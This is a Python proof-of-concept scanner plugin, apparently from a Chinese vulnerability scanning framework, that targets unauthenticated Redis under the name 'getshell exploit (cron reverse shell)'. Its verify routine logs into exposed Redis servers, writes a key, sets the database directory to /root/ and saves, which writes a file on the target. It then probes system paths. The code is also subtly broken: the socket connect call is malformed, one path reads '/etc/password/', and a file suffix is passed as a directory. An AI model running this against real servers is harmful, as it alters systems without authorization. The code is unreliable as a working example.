# coding:utf-8
import redis
import socket
import urllib.parse
import random
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Redis_0104'  # 平台漏洞编号
    name = 'redis getshell expliot (/var/spool/cron reverse shell)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    redis getshell expliot (/var/spool/cron reverse shell)
    检查Redis未授权访问->检查是否存在web服务->检查exp必需的权限和功能->枚举绝对路径->输出结果供手工测试
    '''  # 漏洞描述
    ref = 'https://_thorns.gitbooks.io/sec/content/qian_liang_pian_wen_zhang_jie_shao_le_liang_zhong_.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Redis'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '412c8a05-eae8-479c-9ebe-58caad3d56aa'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def checkPortTcp(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        try:
            s.connect(ip, port)
            s.close()
            return True
        except:
            s.close()
            return False

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            ip = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 6379
            for web_port in [80, 443, 8080, 8443]:  # 判断web服务
                if not self.checkPortTcp(ip, web_port):
                    return False
            try:
                r = redis.Redis(host=ip, port=port, db=0, socket_timeout=5)
                if 'redis_version' not in r.info():  # 判断未授权访问
                    return False
                key = ''.join([chr(random.randint(97, 123))
                               for _i in range(10)])
                value = ''.join([chr(random.randint(97, 123))
                                 for _i in range(10)])
                r.set(key, value)  # 判断可写
                r.config_set('dir', '/root/')  # 判断对/var/www的写入权限(目前先判断为root)
                r.config_set('dbfilename', 'dump.rdb')  # 判断操作权限
                r.delete(key)
                r.save()  # 判断可导出
            except Exception as e:
                return False
            ABSPATH_PREFIXES = ['/root/', '/etc/password/', '/usr/bin/local/']
            ABSPATH_SUFFIXES = ['.txt', '.sh', '.py']
            path_list = []
            for each in ABSPATH_PREFIXES:
                try:
                    r.config_set('dir', each.rstrip('/'))
                    path_list.append(each)
                    for suffix in ABSPATH_SUFFIXES:
                        try:
                            r.config_set('dir', suffix.rstrip('/'))
                            path_list.append(each.rstrip('/') + '/' + suffix)
                        except Exception:
                            continue
                except Exception:
                    continue

            if len(path_list):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
